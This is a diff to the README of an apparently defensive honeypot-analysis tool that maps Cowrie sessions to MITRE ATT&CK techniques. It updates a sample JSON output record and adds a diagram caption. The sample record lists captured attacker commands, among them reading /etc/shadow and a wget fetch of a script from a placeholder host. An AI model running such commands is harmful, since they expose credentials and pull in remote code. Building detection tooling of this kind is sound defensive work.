@@ -71,18 +71,25 @@ Emits one JSON record per session:
   "session_id": "a1b2c3d4",
   "src_ip": "203.0.113.10",
   "commands": ["uname -a", "whoami", "cat /etc/shadow", "wget http://example.invalid/x.sh -O /tmp/x.sh"],
-  "techniques": ["T1016", "T1033", "T1041", "T1048", "T1057", "T1082", ...],
-  "dominant_stage": "exfiltration",
-  "progression": ["reconnaissance", "credential_access", "exfiltration"],
+  "techniques": ["T1016", "T1033", "T1057", "T1082", "T1592", "T1595"],
+  "dominant_stage": "reconnaissance",
+  "progression": ["reconnaissance"],
   "confidence": 0.85,
-  "score": 100,
+  "score": 31,
   "actor_label": "automated_scanner",
   "campaign_indicators": [],
-  "dedup_key": "f3a1c9e0b2d47a86"
+  "dedup_key": "905830e685fbbb20"
 }
 ```
 
 ## How it works
+
+![Honeypot → MITRE pipeline](docs/pipeline.png)
+
+*One Cowrie session, end to end: raw JSON events are parsed into a session, mapped to
+MITRE ATT&CK, scored, actor-classified, and reduced to an order-independent replay-dedup
+key — all deterministically, from the standard library alone. The values shown are the
+real output of [`examples/sample_cowrie.json`](examples/sample_cowrie.json).*
 
 ### Mapping (`map_techniques`)
 Each command line is lower-cased and tested against a hand-curated table of
